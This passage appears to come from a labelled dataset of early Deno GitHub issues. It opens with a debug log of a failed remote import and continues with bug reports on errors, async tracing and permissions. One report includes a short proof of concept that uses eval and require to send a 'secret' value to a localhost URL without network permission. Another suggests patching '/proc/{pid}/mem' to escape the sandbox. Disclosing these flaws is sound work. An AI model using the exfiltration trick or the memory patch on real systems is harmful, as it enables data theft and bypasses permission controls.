/home/ns/.deno/deps/cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\r\nDEBUG JS - getScriptKind() /home/ns/.deno/deps/cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\r\nDEBUG JS - getCompilationSettings()\r\nDEBUG JS - getDefaultLibFileName()\r\nDEBUG JS - compiler.resolveModule { moduleSpecifier: \"globals.d.ts\", containingFile: \"$asset$\" }\r\nDEBUG JS - compiler.resolveFileName { moduleSpecifier: \"globals.d.ts\", containingFile: \"$asset$\" }\r\nDEBUG JS - resolveModule sourceCode length: 134678\r\nDEBUG JS - resolveModule has outputCode: true\r\nDEBUG JS - compiler.setFileName { moduleSpecifier: \"globals.d.ts\", containingFile: \"$asset$\" }\r\nDEBUG JS - resolveModuleNames() { moduleNames: [ \"./dep\" ], containingFile: \"/home/ns/.deno/deps/cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\" }\r\nDEBUG JS - compiler.resolveModule { moduleSpecifier: \"./dep\", containingFile: \"/home/ns/.deno/deps/cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\" }\r\nDEBUG JS - compiler.resolveFileName { moduleSpecifier: \"./dep\", containingFile: \"/home/ns/.deno/deps/cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\" }\r\nDEBUG JS - os.ts codeFetch ./dep /home/ns/.deno/deps/cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\r\nDEBUG RS - code_fetch. module_specifier ./dep containing_file /home/ns/.deno/deps/cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\r\nDEBUG RS - resolve_module module_specifier ./dep containing_file http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\r\nDEBUG RS - module_name: http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/dep, filename: /home/ns/.deno/deps/cdn.rawgit.com/qoh/deno-remote-import-bug/tag/dep\r\nDownloading http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/dep\r\nDEBUG RS - resolving host=\"cdn.rawgit.com\", port=80\r\nDEBUG RS - connecting to 151.139.237.11:80\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - flushed 74 bytes\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - read 468 bytes\r\nDEBUG RS - parsed 7 headers\r\nDEBUG RS - incoming body is content-length (178 bytes)\r\nDEBUG RS - incoming body completed\r\nDEBUG RS - pooling idle connection for (\"http://cdn.rawgit.com\", Http1)\r\nDEBUG RS - Trying http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/dep.ts...\r\nDownloading http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/dep.ts\r\nDEBUG RS - dropping I/O source: 0\r\nDEBUG RS - resolving host=\"cdn.rawgit.com\", port=80\r\nDEBUG RS - connecting to 151.139.237.11:80\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - flushed 77 bytes\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - read 471 bytes\r\nDEBUG RS - parsed 7 headers\r\nDEBUG RS - incoming body is content-length (178 bytes)\r\nDEBUG RS - incoming body completed\r\nDEBUG RS - pooling idle connection for (\"http://cdn.rawgit.com\", Http1)\r\nDEBUG RS - Trying http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/dep.js...\r\nDownloading http://cdn.rawgit.com/qoh/deno-remote-import-bug/tag/dep.js\r\nDEBUG RS - dropping I/O source: 0\r\nDEBUG RS - resolving host=\"cdn.rawgit.com\", port=80\r\nDEBUG RS - connecting to 151.139.237.11:80\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - flushed 77 bytes\r\nDEBUG RS - loop process - 1 events, 0.000s\r\nDEBUG RS - read 471 bytes\r\nDEBUG RS - parsed 7 headers\r\nDEBUG RS - incoming body is content-length (178 bytes)\r\nDEBUG RS - incoming body completed\r\nDEBUG RS - pooling idle connection for (\"http://cdn.rawgit.com\", Http1)\r\nDEBUG RS - msg_from_js CodeFetch sync true\r\nDEBUG RS - dropping I/O source: 0\r\nDEBUG RS - op err Cannot resolve module \"./dep\" from \"/home/ns/.deno/deps/cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\"\r\nDEBUG JS - compiler.getGeneratedContents gen/bundle/main.js\r\nDEBUG JS - compiler.getGeneratedContents main.js.map\r\nNotFound: Cannot resolve module \"./dep\" from \"/home/ns/.deno/deps/cdn.rawgit.com/qoh/deno-remote-import-bug/tag/entry.ts\"\r\n    at maybeError (deno/js/errors.ts:25:12)\r\n    at maybeThrowError (deno/js/errors.ts:14:15)\r\n    at sendSync (deno/js/dispatch.ts:70:5)\r\n    at Object.codeFetch (deno/js/os.ts:31:19)\r\n    at DenoCompiler.resolveModule (deno/js/compiler.ts:525:38)\r\n    at DenoCompiler._resolveModuleName (deno/js/compiler.ts:349:33)\r\n    at moduleNames.map.name (deno/js/compiler.ts:657:33)\r\n    at Array.map (<anonymous>)\r\n    at DenoCompiler.resolveModuleNames (deno/js/compiler.ts:649:24)\r\n    at Object.compilerHost.resolveModuleNames (deno/third_party/node_modules/typescript/lib/typescript.js:111684:117)\r\n```\r\n\r\n---\r\n\r\n```shell\r\n$ deno --version\r\ndeno: 0.1.7\r\nv8: 7.0.276.15\r\n```"},{"labels":["bug"],"text":"Run this script (`echo_server.ts`) using __RELEASE__ build:\r\n```ts\r\nimport * as deno from \"deno\";\r\n\r\nconst listener = deno.listen(\"tcp\", \"127.0.0.1:4545\");\r\nlistener.accept().then(async (conn) => {\r\n  await deno.copy(conn, conn);\r\n  conn.close();\r\n  listener.close();\r\n});\r\n```\r\nand then try\r\n```bash\r\ncat package.json | nc localhost 4545\r\n```\r\nOn mac, the server immediately dies, and the sending side would display\r\n```\r\nread(net): Connection reset by peer\r\n```\r\n\r\nShould be related to #888 . `ntasks` is unexpectedly decremented to 0 prematurely.\r\n\r\nUPDATE:\r\nActually much worse. As shown in the following, the second `await` result would never be printed\r\n```ts\r\nimport * as deno from \"deno\";\r\n\r\n(async () => {\r\n  console.log(await deno.stat(\".\"));\r\n  // Script dies here\r\n  console.log(await deno.stat(\"..\"));\r\n})();\r\n```"},{"labels":["bug"],"text":"https://github.com/denoland/deno/commit/3c080ca39abff28ed2cc6ac618558cced9c2e842#r30761226\r\nhttps://github.com/rust-lang/rust/issues/54800\r\n\r\nhttps://github.com/denoland/deno/blob/3c080ca39abff28ed2cc6ac618558cced9c2e842/js/copy_file_test.ts#L35-L54\r\n\r\nUnless Rust fixes this immediately, we need to work around this in our code."},{"labels":["bug"],"text":"Code demonstrating the problem:\r\n```ts\r\nimport * as deno from \"deno\";\r\n\r\n(async () => {\r\n  const trace1 = deno.trace(async () => await deno.makeTempDir())\r\n  const trace2 = deno.trace(async () => await deno.stat(\".\"))\r\n  console.log(await trace2);\r\n  console.log(await trace1);\r\n})()\r\n```\r\n__Expected output__:\r\n```\r\n[ { sync: false, name: \"Stat\" } ]\r\n[ { sync: false, name: \"MakeTempDir\" } ]\r\n```\r\n__Actual output__:\r\n```\r\n[ { sync: false, name: \"MakeTempDir\" }, { sync: false, name: \"Stat\" } ]\r\n[ { sync: false, name: \"Stat\" } ]\r\n```\r\n__Cause__:\r\nCurrent `trace` implementation assumes user would immediately `await`s for the trace once it is created, so that inner trace (living inside the function/promise being traced) could simply stack on current trace's stack. However, this is no longer true in the sample code, `trace2` would seems to live on top of `trace1`. During popping, the order is reversed (`trace1` popping the `trace2`'s node) and causes the confusing output\r\n\r\n@ry is this the bug you discovered before on trace?"},{"labels":["bug"],"text":"If this script is run without `--allow-write`, the error is swallowed:\r\n```ts\r\nimport { mkdir } from \"deno\";\r\n\r\nlet dir = \"/tmp/hello_world\"\r\nasync function main() {\r\n  console.log(`creating ${dir}...`);\r\n  await mkdir(dir);\r\n  console.log(`created ${dir}`);\r\n}\r\nmain();\r\n```\r\n\r\n```\r\n~/src/deno> ./out/debug/deno t.ts\r\ncreating /tmp/hello_world...\r\n~/src/deno> echo $?\r\n0\r\n~/src/deno>\r\n```"},{"labels":["bug"],"text":"When running\r\n```ts\r\neval(\"unknownVariable\")\r\n```\r\nDeno gives the following cryptic error message.\r\n```\r\n=====Error inside of prepareStackTrace====\r\nTypeError: CallSite method toString expects CallSite as receiver\r\n    at Object.toString (<anonymous>)\r\n    at stack.map (gen/bundle/main.js:127367:77)\r\n    at Array.map (<anonymous>)\r\n    at prepareStackTrace$1 (gen/bundle/main.js:127367:28)\r\n    at Function.prepareStackTraceWrapper (gen/bundle/main.js:127355:18)\r\n    at onGlobalError (gen/bundle/main.js:127912:25)\r\n=====Original error=======================\r\nERROR RS -\r\n```"},{"labels":["bug"],"text":"As noted as a TODO item in 0d03fafbfec4545098023b7147c5f8fb6ae06f99, the current way we're implementing async FS ops is still blocking. We have to call [tokio_threadpool::blocking](https://docs.rs/tokio-threadpool/0.1/tokio_threadpool/fn.blocking.html) like tokio-fs does.\r\nExample: https://github.com/tokio-rs/tokio/blob/0f44adf5f696ac73dcdcb1fb2b91b87553c57443/tokio-fs/src/rename.rs#L52\r\n\r\nFixing this should not involve touching JS code."},{"labels":["bug"],"text":"I think that using `--allow-write` flag on unix systems with sudo privileges might make deno not sandboxed anymore. What I mean by that is it might allow gaining access `--allow-net` or any other flag by just enabling `--allow-write`.\r\n\r\n`--allow-write` can give you read/write access to process memory `/proc/{pid}/mem`. With this it's possible to patch self memory to \"disable\" flag checks etc.\r\n\r\nI am pretty sure `/proc/{pid}/mem` requires sudo privileges so it's only going to be a case if user runs deno as root."},{"labels":["bug"],"text":"```ts\r\neval(`require([\"http://localhost:8080/a.ts?secret=value\"], () => {\r\n  console.log(\"Done\");\r\n})`);\r\n\r\nexport const x = null;\r\n```\r\nAs shown above, an attacker can still send user's sensitive data to somewhere online even when the user does not provide the `--allow-net` option.\r\n\r\n## Possible soloution:\r\nWe can provide a new flag (e.x: `--allow-require`) and return `null` from `_makeLocalRequire()` unless user provides that flag.\r\nhttps://github.com/denoland/deno/blob/3deaf99a92aeea347e1530f309fd4b226e9677d3/js/compiler.ts#L305-L331"},{"labels":["bug"],"text":"Currently deno doesn't seem handling a url which doesn't have a file extension. However browsers seem working with such urls.\r\n\r\n```html\r\n<script type=\"module\">\r\n  import React from 'https://dev.jspm.io/react';\r\n</script>\r\n```\r\n\r\nI think deno should handle those urls as JavaScript because that's more browser compatible and because it allows deno to work with https://dev.jspm.io. If deno works with jspm.io, I think it enables a lot of more meaningful experiments which depends on npm modules.\r\n"},{"labels":["bug"],"text":"The following\r\n\r\n_main.ts_\r\n```typescript\r\nimport bar from \"https://example.com/bar.ts\"\r\n```\r\n\r\n_bar.ts_\r\n```typescript\r\nimport foo from \"./foo.ts\"\r\n```\r\n\r\nIn the second example, foo.ts ends up resolving to \"$HOME/.deno/deps/example.com/foo.ts\" instead of the expected \"https://example.com/foo.ts\". "},{"labels":["bug"],"text":"A failed assertion in unit_test.ts gives me incorrect line numbers, plus the following scary error:\r\n\r\n```\r\n=====Error inside of prepareStackTrace====\r\nTypeError: CallSite method toString expects CallSite as receiver\r\n    at Object.toString (<anonymous>)\r\n    at stack.map (gen/bundle/main.js:126369:77)\r\n    at Array.map (<anonymous>)\r\n    at prepareStackTrace$1 (gen/bundle/main.js:126369:28)\r\n    at Function.prepareStackTraceWrapper (gen/bundle/main.js:126358:18)\r\n    at Object.runTests [as cb] (C:/Users/BertBelder/d/deno/js/testing/testing.ts:60:39)\r\n=====Original error=======================\r\nError\r\n    at Object.assert (eval at _gatherDependencies (gen/bundle/main.js:126631:16), <anonymous>:32:19)\r\n    at makeTempDir (C:/Users/BertBelder/d/deno/js/unit_tests.ts:72:28)\r\n    at Object.runTests [as cb] (C:/Users/BertBelder/d/deno/js/testing/testing.ts:55:23)\r\nout\\debug\\deno.exe js/unit_tests.ts permW0N0\r\nout\\debug\\deno.exe js/unit_tests.ts permW1N0 --allow-write\r\n```"},{"labels":["bug"],"text":"Calls to fetch should require --allow-net to be passed to deno."},{"labels":["bug"],"text":"They should be executed only once - their exports cached. \r\n\r\nNode behavior\r\n```\r\n~/src/deno> cat test.js\r\nrequire(\"./foo\");\r\nrequire(\"./foo\");\r\n~/src/deno> cat foo.js\r\nconsole.log(\"HELLO\");\r\n~/src/deno> node test.js\r\nHELLO\r\n~/src/deno>\r\n```\r\n\r\nCurrent deno behavior\r\n```\r\n~/src/deno> cat test.ts\r\nimport \"./foo.ts\";\r\nimport \"./foo.ts\";\r\n~/src/deno> cat foo.ts\r\nconsole.log(\"HELLO\");\r\n~/src/deno> ./out/debug/deno test.ts\r\nHELLO\r\nHELLO\r\n~/src/deno>\r\n```"},{"labels":["bug"],"text":"\r\n![image](https://user-images.githubusercontent.com/16065346/40816486-da7a3bf0-657f-11e8-9f63-2c6b9e2c6347.png)\r\n\r\ngo get -u github.com/ry/v8worker2\r\ncd $GOPATH/src/github.com/ry/v8worker2\r\n./build.py --use_ccache\r\n\r\n```\r\nout_path None\r\nRebuilding V8\r\nFetching dependencies.\r\nTraceback (most recent call last):\r\n  File \"./build.py\", line 149, in <module>\r\n    main()\r\n  File \"./build.py\", line 85, in main\r\n    lib_fn = Rebuild()\r\n  File \"./build.py\", line 97, in Rebuild\r\n    EnsureDeps(v8_path)\r\n  File \"./build.py\", line 146, in EnsureDeps\r\n    env=env)\r\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/subprocess.py\", line 535, in check_call\r\n    retcode = call(*popenargs, **kwargs)\r\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/subprocess.py\", line 522, in call\r\n    return Popen(*popenargs, **kwargs).wait()\r\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/subprocess.py\", line 710, in __init__\r\n    errread, errwrite)\r\n  File \"/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/subprocess.py\", line 1335, in _execute_child\r\n    raise child_exception\r\n```\r\n"},{"labels":["bug"],"text":"What do you do with unhandled promise rejections?"}]